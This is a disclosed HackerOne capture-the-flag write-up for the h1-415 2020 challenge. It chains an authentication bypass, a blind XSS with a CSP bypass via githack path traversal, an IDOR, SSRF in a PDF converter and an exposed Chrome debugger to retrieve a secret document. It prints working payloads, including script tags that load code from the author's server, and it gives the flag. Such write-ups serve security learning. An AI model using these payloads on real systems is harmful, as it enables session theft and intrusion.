# [h1-415 2020] My writeup on how to retrieve the special secret document

## Report Details
- **Report ID**: 776684
- **URL**: https://hackerone.com/reports/776684
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-01-17T00:13:11.584Z
- **Disclosed**: 2020-02-03T22:42:23.673Z

## Reporter
- **Username**: blaklis
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
## Summary:
An attacker without any privilege is able to retrieve the special secret document, hosted on the https://h1-415.h1ctf.com website. To do so, multiple steps are required : 

1. The authentication must be bypassed to have a licensed account;
2. The support team portal is vulnerable to a blind XSS,;
3. The CSP rules are bypassable using sort of path traversal to render other javascript files on githack CDN.
4. A direct object reference allow to modify data from every users from the support panel, without filtering of characters.
5. The document converter is vulnerable to SSRF if the user name contains HTML tags.
6. The chrome debugger API is opened, allowing to dump data from the browser used by the document converter.

Here are the steps to finally get this special document !

# Initially

You can register an account on the application. After the registration process, you receive a QRCode which contains two hexadecimal blobs separated by a colon. This QRCode is used in case you forgot your password, and allow to bypass the login process.

The QRCode first blob is simply the username, in hexadecimal ASCII. By removing the second blob and trying to use the QRCode, the error message indicates that it's a code, that is necessary and correctly validated to allow being logged in with this email.

From a simple user without license, fields seems to be well escaped, and the converter seems to works well, without much possibility to exploit anything. Fields (usernames, etc) are correctly filtered; special characters are deleted from those fields.

We can see from the main page that the Jobert's mail address (jobert@mydocz.cosmic) is leaking from the *data-email* attribute of its message.

# Authentication bypass thanks to data filtering

As we saw, data are filtered and special characters are deleted from users information. By creating a user with the jobert@mydocz.cosmic< email, the registration process is successful; however, thanks to the data filtering, the generated QRCode contains the real jobert@mydocz.cosmic email instead of the created one, with a code that also matches well.

By using this QRcode on the https://h1-415.h1ctf.com/recover endpoint, we can now login as Jobert to have a more privileged user, that can use the support endpoint.

We can't change information for this account, and the license seems to be expired, so we can't even use the upload functionality.

# Blind XSS & CSP bypass on the support endpoint

The support endpoint seems to be a chatbot (or a real employee? who knows...), and sending some XSS payloads demonstrates easily that at least the frontend part doesn't sanitize messages at all.

By sending the "quit" message, we're asked to rate the overall communication. If the note is set to the minimum - 1 star - we're notified that an employee will check the discussion to see what happened.

Inputting a XSS payload and then quitting with a bad rating for this discussion, we can trap an employee to make him execute some javascript; however, a Content-Security-Policy rules is in place, containing the following : 

* default-src 'self'; object-src 'none'; script-src 'self' https://raw.githack.com/mattboldt/typed.js/master/lib/; img-src data: * *

It also does not leak the referrer, thanks to the *Referrer-Policy* header set to *strict-origin-when-cross-origin*.

As we can see, we're able to load javascript files from https://raw.githack.com/mattboldt/typed.js/master/lib/ URL, and it's child. I created a new repo on Github, which contains some of my javascript payload. Here is an example, that extracts the current URL to my own server : 

*https://github.com/Blaklis/typed.js/blob/master/lib/yolo.js*

As Githack serves GItHub files directly, as a CDN, and that it treats ..%2f as a traversal, we can simply point to our files using the following URL : 

*https://raw.githack.com/mattboldt/typed.js/master/lib/..%2f..%2f..%2f..%2fBlaklis/typed.js/master/lib//yolo.js*

For the browser, this URL is a child of *https://raw.githack.com/mattboldt/typed.js/master/lib/* and completely respects the CSP rule.

Final payload : <script src="https://raw.githack.com/mattboldt/typed.js/master/lib/..%252f..%252f..%252f..%252fBlaklis/typed.js/master/lib//yolo.js"/>

This leaks a URL that is directly accessible - even unauthenticated - to the support panel for this very own discussion, for example https://h1-415.h1ctf.com/support/review/5529c168769ff7e096bb40cc9438a5295692bb567844c837bb5fae37980612ee

# Direct object reference allows to edit every users' information without filtering

When we're on the support page, we can see a form that allow to change users' information. This form also contains a *user_id* field, which is not checked at all. Consequently, we're able to change every users name through this page.
Also, we can see that there's no filtering on characters on this page, allowing to includes some XSS payload in the name, while it wasn't possible for the public /settings endpoint.

The jobert's account can't be modified, even with this method. We can so create an account, and then edit it through this way to have some forbidden characters in its name.

A payload example, considering we own the user 16 : 

```
POST /support/review/85c8e222848012b567fed595a6bdcb3b57ce6bce4716d132e8361536fcc29031 HTTP/1.1
[...]
Cookie: _csrf_token=312edf8cc51423f130df5a09c958c4855eff90c7; session=.eJwli8sOgjAQRb_FWRPSp5au-Ah3xpA6zCiBFkPrghj_3RpXJ-fk3jcMmDceyjpTAg9aKhrZIVpplGapxcg2iA4769A4a4m5E3iCBvARCvjLtQGKYVrq-baEeZlym6Ztr-zvv97iGuv6lWkbyv4k8PpvKcQqcKZcpNLGHg_w-QKRNi0N.XiDmKA.o5lphYOx41pDSbeAm37D7wA9grg

name=<script src="http://blakl.is/pwn.js"/>&user_id=16&_csrf_token=312edf8cc51423f130df5a09c958c4855eff90c7
```

# SSRF in document conversion

The document converter allow to upload images to get PDF as output. The PDF also contains the owner's name, and is vulnerable to a XSS when being interpreted by the converter. This allows to make some redirect using a <script>document.location.href='//website'</script> payload, for example. It also interprets iframe, which allow to inspects which ports are opened locally easily.

I saw that ~300 iframes in the same document is possible without having a timeout from the converter. This allow to create a lot of iframes to localhost, with different ports, to see if it outputs something. Multiple ports have been found open, and notably : 

- 80
- 443
- 3000
- 9222
- 13398

The 9222 port responds with a "Inspectable web contents" message, which corresponds to the debugger API from Chrome, which is a pretty interesting target.

Here is an example payload that sets the payload in the name of the user 16 : 

``
POST /support/review/85c8e222848012b567fed595a6bdcb3b57ce6bce4716d132e8361536fcc29031 HTTP/1.1
[...]
Cookie: _csrf_token=312edf8cc51423f130df5a09c958c4855eff90c7; session=.eJwli8sOgjAQRb_FWRPSp5au-Ah3xpA6zCiBFkPrghj_3RpXJ-fk3jcMmDceyjpTAg9aKhrZIVpplGapxcg2iA4769A4a4m5E3iCBvARCvjLtQGKYVrq-baEeZlym6Ztr-zvv97iGuv6lWkbyv4k8PpvKcQqcKZcpNLGHg_w-QKRNi0N.XiDmKA.o5lphYOx41pDSbeAm37D7wA9grg

name=<iframe src="http://localhost:9222"/>&user_id=16&_csrf_token=312edf8cc51423f130df5a09c958c4855eff90c7
```

The user 16 is now able to make a document conversion. The output document will contains an iframe with data from http://localhost:9222.

# Chrome debugger API opened

The Chrome debugger API is enabled and can be accessed through the SSRF from the previous step. There are both a Websocket API (complete) and a JSON API (limited) that allows to retrieve data from this interface.

By using the JSON api, hitting the */json/list* endpoint, we can see every tabs that are currently opened, with associated URLs and titles. Here is a sample of data returned : 

```
[ {   "description": "",   "devtoolsFrontendUrl": "/devtools/inspector.html?ws=localhost:9222/devtools/page/06B5383E01A67809265501A45699022A",   "id": "06B5383E01A67809265501A45699022A",   "title": "My Docz Converter",   "type": "page",   "url":"http://localhost:3000/converter/de5be989b6ba5bf281074073611b12a2cef1fab3fb24f99decc6be773fce5927.png?user_name=Jobert%3Cscript%3Edocument.location.href%3D%27http%3A//localhost%3A9222/json%27%3C/script%3E",   "webSocketDebuggerUrl": "ws://localhost:9222/devtools/page/06B5383E01A67809265501A45699022A"}, {   "description": "",   "devtoolsFrontendUrl": "/devtools/inspector.html?ws=localhost:9222/devtools/page/40B45AD7E01052E5E79BE278D1C6F03C",   "id": "40B45AD7E01052E5E79BE278D1C6F03C",   "title": "My Docz Converter",   "type": "page",   "url": "http://localhost:3000/login?secret_document=0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf",   "webSocketDebuggerUrl": "ws://localhost:9222/devtools/page/40B45AD7E01052E5E79BE278D1C6F03C"}, {   "description": "",   "devtoolsFrontendUrl": "/devtools/inspector.html?ws=localhost:9222/devtools/page/69206B536A6D44F4950C2BE822522BF8",   "id": "69206B536A6D44F4950C2BE822522BF8",   "title": "about:blank",   "type": "page",   "url": "about:blank",   "webSocketDebuggerUrl": "ws://localhost:9222/devtools/page/69206B536A6D44F4950C2BE822522BF8"}, {   "description": "",   "devtoolsFrontendUrl": "/devtools/inspector.html?ws=localhost:9222/devtools/page/37FC54275A3B9966EE6307427568FF34",   "id": "37FC54275A3B9966EE6307427568FF34",   "title": "about:blank",   "type": "page",   "url": "about:blank",   "webSocketDebuggerUrl": "ws://localhost:9222/devtools/page/37FC54275A3B9966EE6307427568FF34"}, {   "description": "",   "devtoolsFrontendUrl": "/devtools/inspector.html?ws=localhost:9222/devtools/page/D06A13E7032D841AD5B56B06F055B4B9",   "id": "D06A13E7032D841AD5B56B06F055B4B9",   "title": "about:blank",   "type": "page",   "url": "about:blank",   "webSocketDebuggerUrl": "ws://localhost:9222/devtools/page/D06A13E7032D841AD5B56B06F055B4B9"} ]
```

As we can see, there is a *http://localhost:3000/login?secret_document=0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf* tab that is opened. By retrieving the secret document name, and trying to access it as a normal document, we can see the secret document here : 

*https://h1-415.h1ctf.com/documents/0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf*

The flag is *h1ctf{y3s_1m_c0sm1c_n0w}*


This was a nice challenge, thank you for that!

Best regards,
Blaklis

## Impact

Attackers are able to access the very secret document from Jobert!

## Attachments
No attachments
